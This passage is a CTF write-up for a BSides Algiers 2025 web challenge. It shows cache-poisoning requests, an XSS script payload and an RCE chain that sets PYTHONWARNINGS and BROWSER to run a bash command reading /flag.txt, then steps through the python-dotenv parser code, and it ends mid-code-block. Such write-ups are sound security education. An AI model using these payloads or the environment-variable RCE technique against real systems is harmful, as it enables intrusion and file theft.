        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>GET /search?query=I%20BELEIVE%20IT%20DOESNT%20WORK HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 21

query=malicious_query</code></pre></div>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/cache_posioning_poc.gif"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/cache_posioning_poc.gif, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/cache_posioning_poc.gif 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/cache_posioning_poc.gif 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/cache_posioning_poc.gif"
        title="cache posinoning poc" /></p>
<hr>
<h3 id="discovery-2-xss-in-the-mix">Discovery #2: XSS in the Mix</h3>
<p>But then, what can we do with that cache poisoning?</p>
<p>With template autoescaping disabled (<code>autoescape=None</code> in the Tornado config), any HTML I could inject would execute. The search results were being rendered directly into the page, so my cached payload could contain an XSS.</p>
<p>I first tried the basic thing which is reading the admin cookie, but it didn&rsquo;t work. So then I just made a PoC to make the admin visit a search with a controlled query. After it expires from the cache, it will be added to the <code>/api/prev_searches</code> endpoint.</p>
<p>I was sending the query like this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>GET /search?query=I%20BELEIVE%20IT%20DOESNT%20WORK HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 51

query=&lt;script&gt;fetch(&#39;/search?query=pwned&#39;)&lt;/script&gt;</code></pre></div>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png, /blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png"
        title="Showing how the XSS payload is injected into the request through query param" /></p>
<hr>
<h3 id="discovery-3-the-python-antigravity">Discovery #3: The Python Antigravity</h3>
<p>The admin panel at <code>/panel</code> was interesting. It allowed configuring backup settings - specifically <code>BACKUP_SERVER</code> and <code>ARCHIVE_PATH</code> - which were stored in a <code>.env</code> file using <code>python-dotenv</code>.</p>
<p>I started experimenting with the input validation. There was commented-out blacklist code, but it wasn&rsquo;t active. That meant I could inject arbitrary values.</p>
<p>Here&rsquo;s where things got interesting. When the &ldquo;Run Backup&rdquo; button is clicked, it executes:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-python">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&#34;/usr/local/bin/python3&#34;</span><span class="p">,</span> <span class="s2">&#34;/app/utils/backup_catalog.py&#34;</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">,</span> <span class="o">...</span><span class="p">)</span></span></span></code></pre></div></div>
<p>The environment variables from <code>.env</code> are passed to the Python subprocess.</p>
<p>But how could I turn <code>.env</code> file manipulation into code execution?</p>
<p>After a bit, I remembered an idea that I saw one time which lets you achieve RCE just through manipulating environment variables.</p>
<p>The trick is using a Python module called <code>antigravity</code>. Now I want you to experiment with something weird.</p>
<p>Open your terminal, then enter the Python shell and do:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>import antigravity</code></pre></div>
<hr>
<h1 id="whats-the-weirdest-thing-that-can-happen-"><strong>whats the weirdest thing that can happen ???????</strong></h1>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro-usopp.gif"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro-usopp.gif, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro-usopp.gif 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro-usopp.gif 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro-usopp.gif"
        title="what" /></p>
<hr>
<h1 id="lets-try-it-and-find-out"><strong>lets try it and find out</strong></h1>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/antigravity_poc.gif"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/antigravity_poc.gif, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/antigravity_poc.gif 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/antigravity_poc.gif 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/antigravity_poc.gif"
        title="antigravity weird behavior" /></p>
<hr>
<p>After some research, I found that I can get RCE by combining antigravity with an uncommon option in Python&rsquo;s warnings module.</p>
<p>The documentation for PYTHONWARNINGS states that it is equivalent to using the -W command-line option. The -W option controls how warnings are handled, allowing you to specify which warnings are shown and how often. Its full syntax is
action:message:category:module:line.</p>
<p>We can combine that with the antigravity behavior.</p>
<p>When antigravity is imported, it opens a web browser using the standard library&rsquo;s webbrowser module. That module respects the BROWSER environment variable, which allows you to specify which executable should be launched.</p>
<p>So the idea is to combine the two environment variables <code>PYTHONWARNINGS</code> and <code>BROWSER</code> to achieve RCE.</p>
<p>You can read more about it here:
<a href="https://www.elttam.com/blog/env/" target="_blank" rel="noopener noreffer ">https://www.elttam.com/blog/env/</a></p>
<p>So let&rsquo;s build the final payload, setting <code>PYTHONWARNINGS</code> to:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>PYTHONWARNINGS=all:0:antigravity.x:0:0</code></pre></div>
<p>And the <code>BROWSER</code> environment variable to:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>BROWSER=/bin/bash -c &#34;cat /flag.txt&gt;/app/static/pwl.txt&#34; &amp; #%s</code></pre></div>
<p>Of course, there are a lot of payloads. I inspired mine from this article:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>https://bughunters.google.com/reports/vrp/dsyW9gzdm</code></pre></div>
<p>Now the goal is to make these two environment variables present in the <code>.env</code> file.</p>
<p>The problem is that we can only set these two environment variables:</p>
<ul>
<li><code>archive_path</code></li>
<li><code>backup_server</code></li>
</ul>
<p>And these are not the ones we&rsquo;re looking to set!</p>
<p>This takes us to the last vulnerability in our chain.</p>
<h3 id="discovery-4-how-we-can-overwrite-the-env-file">Discovery #4: How We Can Overwrite the .env File</h3>
<p>This part was the hardest, to be honest, because we must trick the parsing method used in <code>load_dotenv(ENVIRON_FILE)</code>. The dotenv library is used with the latest version, so there are no obvious CVEs.</p>
<p>So first I tried basic things like injecting a newline and CRLF, but it didn&rsquo;t really work.</p>
<p>At this point, I was feeling just one thing: A SKILL ISSUE</p>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/skill-issue.gif"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/skill-issue.gif, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/skill-issue.gif 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/skill-issue.gif 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/skill-issue.gif"
        title="skill issue" /></p>
<hr>
<p>But then the challenge author said that I was actually in the last steps of solving the challenge and suggested diving deeper into the dotenv library&rsquo;s source code. He also mentioned that at that point, I was the only onsite player trying the challenge and had gotten some real findings.</p>
<p>Okay! Let&rsquo;s do that.</p>
<p>For this step there is no article that can help - we must just read the code here:
<a href="https://github.com/theskumar/python-dotenv" target="_blank" rel="noopener noreffer ">https://github.com/theskumar/python-dotenv</a></p>
<h4 id="understanding-the-dotenv-parser">Understanding the dotenv Parser</h4>
<p>There are two files that we are interested in:</p>
<p><a href="https://github.com/theskumar/python-dotenv/blob/main/src/dotenv/main.py" target="_blank" rel="noopener noreffer ">https://github.com/theskumar/python-dotenv/blob/main/src/dotenv/main.py</a>
<a href="https://github.com/theskumar/python-dotenv/blob/main/src/dotenv/parser.py" target="_blank" rel="noopener noreffer ">https://github.com/theskumar/python-dotenv/blob/main/src/dotenv/parser.py</a></p>
<p>The first thing was to understand how the <code>set_key</code> function works:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">quote</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">value_out</span> <span class="o">=</span> <span class="s2">&#34;&#39;</span><span class="si">{}</span><span class="s2">&#39;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">value_to_set</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#39;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">value_out</span> <span class="o">=</span> <span class="n">value_to_set</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">export</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">line_out</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;export </span><span class="si">{</span><span class="n">key_to_set</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">value_out</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">line_out</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">key_to_set</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">value_out</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span></span></span></code></pre></div></div>
<p>And how <code>load_dotenv</code> parses keys from the file.</p>
<p><code>load_dotenv</code> instantiates an instance from the <code>DotEnv</code> class and sets a method called <code>parser</code>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Iterator</span><span class="p">[</span><span class="n">Tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]]]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_stream</span><span class="p">()</span> <span class="k">as</span> <span class="n">stream</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">mapping</span> <span class="ow">in</span> <span class="n">with_warn_for_invalid_lines</span><span class="p">(</span><span class="n">parse_stream</span><span class="p">(</span><span class="n">stream</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">mapping</span><span class="o">.</span><span class="n">key</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">yield</span> <span class="n">mapping</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">mapping</span><span class="o">.</span><span class="n">value</span></span></span></code></pre></div></div>
<p>We follow <code>parse_stream</code> to find this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_stream</span><span class="p">(</span><span class="n">stream</span><span class="p">:</span> <span class="n">IO</span><span class="p">[</span><span class="nb">str</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">Iterator</span><span class="p">[</span><span class="n">Binding</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">reader</span> <span class="o">=</span> <span class="n">Reader</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">reader</span><span class="o">.</span><span class="n">has_next</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">yield</span> <span class="n">parse_binding</span><span class="p">(</span><span class="n">reader</span><span class="p">)</span></span></span></code></pre></div></div>
<p>That finally points us to this function:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_binding</span><span class="p">(</span><span class="n">reader</span><span class="p">:</span> <span class="n">Reader</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Binding</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">reader</span><span class="o">.</span><span class="n">set_mark</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_multiline_whitespace</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">reader</span><span class="o">.</span><span class="n">has_next</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Binding</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">key</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">value</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">original</span><span class="o">=</span><span class="n">reader</span><span class="o">.</span><span class="n">get_marked</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                <span class="n">error</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_export</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">parse_key</span><span class="p">(</span><span class="n">reader</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_whitespace</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">reader</span><span class="o">.</span><span class="n">peek</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;=&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_equal_sign</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">value</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="n">parse_value</span><span class="p">(</span><span class="n">reader</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">value</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_comment</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_end_of_line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Binding</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">value</span><span class="o">=</span><span class="n">value</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">original</span><span class="o">=</span><span class="n">reader</span><span class="o">.</span><span class="n">get_marked</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="n">error</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">Error</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_rest_of_line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Binding</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">key</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">value</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">original</span><span class="o">=</span><span class="n">reader</span><span class="o">.</span><span class="n">get_marked</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="n">error</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span></span></span></code></pre></div></div>
<p>We are interested in these two lines that define how the key and value are read:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">parse_key</span><span class="p">(</span><span class="n">reader</span><span class="p">)</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">value</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="n">parse_value</span><span class="p">(</span><span class="n">reader</span><span class="p">)</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_key</span><span class="p">(</span><span class="n">reader</span><span class="p">:</span> <span class="n">Reader</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">char</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">peek</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s2">&#34;#&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">key</span><span class="p">,)</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_single_quoted_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">key</span><span class="p">,)</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_unquoted_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">key</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_value</span><span class="p">(</span><span class="n">reader</span><span class="p">:</span> <span class="n">Reader</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">char</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">peek</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">value</span><span class="p">,)</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_single_quoted_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">decode_escapes</span><span class="p">(</span><span class="n">_single_quote_escapes</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">value</span><span class="p">,)</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_double_quoted_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">decode_escapes</span><span class="p">(</span><span class="n">_double_quote_escapes</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">char</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">parse_unquoted_value</span><span class="p">(</span><span class="n">reader</span><span class="p">)</span></span></span></code></pre></div></div>
<p>And also we are interested in some variables that have regex defined at the beginning.</p>
<p>We are interested in these variables:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">_single_quoted_key</span> <span class="o">=</span> <span class="n">make_regex</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;&#39;([^&#39;]+)&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_unquoted_key</span> <span class="o">=</span> <span class="n">make_regex</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;([^=\#\s]+)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">_single_quoted_value</span> <span class="o">=</span> <span class="n">make_regex</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;&#39;((?:</span><span class="se">\\</span><span class="s2">&#39;|[^&#39;])*)&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_unquoted_value</span> <span class="o">=</span> <span class="n">make_regex</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;([^\r\n]*)&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
<p>In the code of the app, it is being used like this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
